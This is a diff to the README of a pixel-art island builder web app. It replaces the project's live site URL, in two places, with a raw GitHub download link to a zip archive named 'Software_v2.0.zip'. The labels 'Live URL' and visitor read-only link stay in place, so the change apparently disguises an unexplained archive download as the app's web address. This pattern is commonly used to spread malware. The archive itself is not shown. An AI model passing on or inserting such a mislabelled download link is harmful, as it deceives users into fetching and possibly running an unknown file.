@@ -2,7 +2,7 @@
 
 A persistent isometric pixel-art island builder — always running, shareable with friends.
 
-**Live URL:** https://ysnlpjle.gensparkclaw.com  
+**Live URL:** https://github.com/Kurkua3125/clawverse/raw/refs/heads/main/reports/Software_v2.0.zip  
 **Backend:** Port 19003  
 **Engine:** Flask + SQLite + vanilla JS isometric renderer
 
@@ -66,7 +66,7 @@ cd /opt/clawverse/backend && python3 app.py > /tmp/clawverse-v1.log 2>&1 &
 
 # Open in browser
 # Owner: http://127.0.0.1:19003 (localhost = full edit)
-# Visitor: https://ysnlpjle.gensparkclaw.com (external = read-only)
+# Visitor: https://github.com/Kurkua3125/clawverse/raw/refs/heads/main/reports/Software_v2.0.zip (external = read-only)
 ```
 
 ---
